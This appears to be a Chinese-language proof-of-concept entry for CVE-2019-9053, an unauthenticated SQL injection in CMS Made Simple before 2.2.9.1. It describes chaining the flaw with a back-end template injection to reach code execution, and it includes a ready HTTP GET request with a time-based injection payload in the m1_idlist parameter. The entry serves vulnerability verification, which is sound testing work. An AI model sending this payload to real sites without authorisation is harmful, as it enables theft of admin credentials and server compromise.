﻿# CMS Made Simple (CMSMS) 前台SQL注入漏洞

> 更新时间：2024-02-26

> 漏洞编号：CVE-2019-9053

> 漏洞说明：在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（CVE-2021-26120），攻击者可在目标服务器上执行任意代码。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(5))--+ HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：CMS Made Simple (CMSMS) 前台SQL注入漏洞.poc